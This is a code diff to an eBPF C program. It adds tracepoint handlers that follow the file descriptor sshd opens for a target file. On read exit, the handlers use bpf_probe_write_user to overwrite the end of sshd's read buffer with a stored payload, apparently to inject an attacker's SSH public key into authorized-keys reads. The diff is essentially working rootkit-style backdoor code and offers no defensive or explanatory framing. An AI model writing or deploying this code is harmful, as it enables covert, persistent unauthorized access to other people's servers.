@@ -64,6 +64,7 @@ SEC("tracepoint/syscalls/sys_enter_openat")
 int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
+    // pid is not used, not known why it's here
     int pid = pid_tgid >> 32;
     // Check if we're a process thread of interest
     // if target_ppid is 0 then we target all pids
@@ -107,7 +108,7 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
 
     // Print Command and Filename info
     bpf_printk("Comm %s\n", comm);
-    bpf_printk("Filename %s\n", filename);
+    bpf_printk("Openat Filename %s\n", filename);
 
     // If filtering by UID check that
     if (uid != 0) {
@@ -123,4 +124,140 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
 
     return 0;
 }
-    
+
+SEC("tracepoint/syscalls/sys_exit_openat")
+int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
+{
+    // Check this open call is opening our target file
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    unsigned int *check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
+    if (check == 0)
+    {
+        return 0;
+    }
+
+    // Set the map value to be the returned file descriptor
+    unsigned int fd = (unsigned int)ctx->ret;
+    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);
+
+    return 0;
+}
+
+SEC("tp/syscalls/sys_enter_read")
+int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
+{
+    // Check this open call is opening our target file
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    int pid = pid_tgid >> 32;
+    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
+    if (pfd == 0) {
+        return 0;
+    }
+
+    // Check this is the sshd file descriptor
+    unsigned int map_fd = *pfd;
+    unsigned int fd = (unsigned int)ctx->args[0];
+    if (map_fd != fd) {
+        return 0;
+    }
+
+    // Store buffer address from arguments in map
+    long unsigned int buff_addr = ctx->args[1];
+    size_t buff_size = (size_t)ctx->args[2];
+    struct syscall_read_logging data;
+    data.buffer_addr = buff_addr;
+    data.calling_size = buff_size;
+    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &data, BPF_ANY);
+
+    return 0;
+}
+
+SEC("tp/syscalls/sys_exit_read")
+int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
+{
+    bpf_printk("The read Exit Called\n");
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    int pid = pid_tgid >> 32;
+
+    // Lookup for buffer and size
+    struct syscall_read_logging *data;
+    data = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
+    if (data == 0)
+    {
+        return 0;
+    }
+    long unsigned int buff_addr = data->buffer_addr;
+    if (buff_addr <= 0)
+    {
+        return 0;
+    }
+
+    // This is amount of data returned from the read syscall
+    if (ctx->ret <= 0)
+    {
+        return 0;
+    }
+    long int read_size = ctx->ret;
+
+    // read_size less than payload, we can't write in the buffer
+    // read_size == data->calling_size true means read max when sshd want read. 
+    // Also means this is not the file's end.
+    if (read_size < max_payload_len || read_size == data->calling_size ) {
+        return 0;
+    }
+    // |<-------------------------- data->calling_size read(calling_size) -------------------------------------->|
+    // |<--------- raw content ------->|<-------------- payload -------------->|
+    // |<----------------------------- ret_size ------------------------------>|
+    // |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
+    // |<----
+
+    // Get payload
+    struct custom_payload *payload;
+    __u8 key = 0;
+    payload = bpf_map_lookup_elem(&map_payload_buffer, &key);
+    if (payload == 0)
+    {
+        return 0;
+    }
+
+    // Restrict payload len too small or to big.
+    u32 len = payload->payload_len;
+    if (len <= 0 || len > max_payload_len ) {
+        return 0;
+    }
+
+    long unsigned int new_buff_addr = buff_addr + read_size - max_payload_len;
+    //      |<-------------------------- data->calling_size read(calling_size) -------------------------------------->|
+    //      |<--------- raw content ------->|<-------------- payload -------------->|
+    //      |<----------------------------- ret_size ------------------------------>|
+    // best |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
+    // now  |<-- buff_addr             |<-- new_buff_addr                           |<-- new_buff_addr + max_payload_len
+
+    // Rewrite
+    bpf_probe_write_user((void *)new_buff_addr, payload->raw_buf, max_payload_len);
+
+    // There need bpf delete the pid in maps to avoid the rewrite the others ssh pub keys.
+    // Closing file, delete fd from all maps to clean up
+    bpf_map_delete_elem(&map_fds, &pid_tgid);
+    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);
+
+    return 0;
+}
+
+SEC("tp/syscalls/sys_exit_close")
+int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
+{
+    // Check if we're a process thread of interest
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    int pid = pid_tgid >> 32;
+    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
+    if (check == 0) {
+        return 0;
+    }
+
+    // Closing file, delete fd from all maps to clean up
+    bpf_map_delete_elem(&map_fds, &pid_tgid);
+    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);
+
+    return 0;
+}
